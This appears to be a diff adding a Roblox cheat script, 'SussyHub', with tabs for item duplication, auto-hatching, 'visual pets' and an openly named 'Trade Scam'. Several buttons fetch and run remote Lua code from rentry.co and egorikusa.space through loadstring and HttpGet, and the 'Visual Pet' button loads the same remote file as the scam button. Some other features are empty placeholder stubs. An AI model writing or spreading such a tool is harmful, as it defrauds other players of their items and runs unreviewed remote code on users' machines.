@@ -1,0 +1,118 @@
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+local Window = OrionLib:MakeWindow({
+    Name = "SussyHub",
+    HidePremium = false,
+    Introtext = "Trade Scam",
+    SaveConfig = true,
+    ConfigFolder = "SussyHub"
+})
+
+OrionLib:MakeNotification({
+    Name = "🤫",
+    Content = " successful",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+local DupeTab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local DupeSection = DupeTab:AddSection({
+    Name = "Dupe Section"
+})
+
+DupeTab:AddButton({
+    Name = "Dupe Huge",
+    Callback = function()
+        loadstring(game:HttpGet('https://rentry.co/cwp9dfqy/raw', true))()
+        print("Dupe script executed!")
+    end    
+})
+
+DupeTab:AddToggle({
+    Name = "Tap this 3 times to make the trade scam work !",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            print("Trade scam enabled")
+            -- Add your trade scam logic here if applicable
+        else
+            print("Trade scam disabled")
+            -- Add disable logic if needed
+        end
+    end    
+})
+
+local AutoHatchTab = Window:MakeTab({
+    Name = "Auto Hatch",
+    Icon = "rbxassetid://YourIconIdHere",
+    PremiumOnly = false
+})
+
+AutoHatchTab:AddButton({
+    Name = "Auto Hatch Option",
+    Callback = function()
+        -- Add your auto hatch logic here
+        print("Auto hatch activated!")
+    end
+})
+
+AutoHatchTab:AddToggle({
+    Name = "Auto Hatch Toggle",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            print("Auto hatch enabled")
+            -- Add auto hatch enable logic here
+        else
+            print("Auto hatch disabled")
+            -- Add auto hatch disable logic here
+        end
+    end
+})
+
+local TradeScamTab = Window:MakeTab({
+    Name = "Trade Scam",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+TradeScamTab:AddButton({
+    Name = "Trade Scam",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/5caab90594d14d78afce27a5.lua", true))()
+        print("Trade scam script executed!")
+    end    
+})
+
+local VisualPetTab = Window:MakeTab({
+    Name = "Visual Pet",
+    Icon = "rbxassetid://YourIconIdHere",
+    PremiumOnly = false
+})
+
+local VisualPetSection = VisualPetTab:AddSection({
+    Name = "Visual Pet Section"
+})
+
+VisualPetSection:AddButton({
+    Name = "Visual Pet",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/5caab90594d14d78afce27a5.lua", true))()
+        print("Visual Pet script executed!")
+    end    
+})
+
+VisualPetSection:AddTextBox({
+    Name = "Text Box",
+    Default = "Default Text",
+    Callback = function(Value)
+        print("Text Box value changed to: " .. Value)
+        -- Add your text box logic here if needed
+    end
+})
+
+OrionLib:Init()
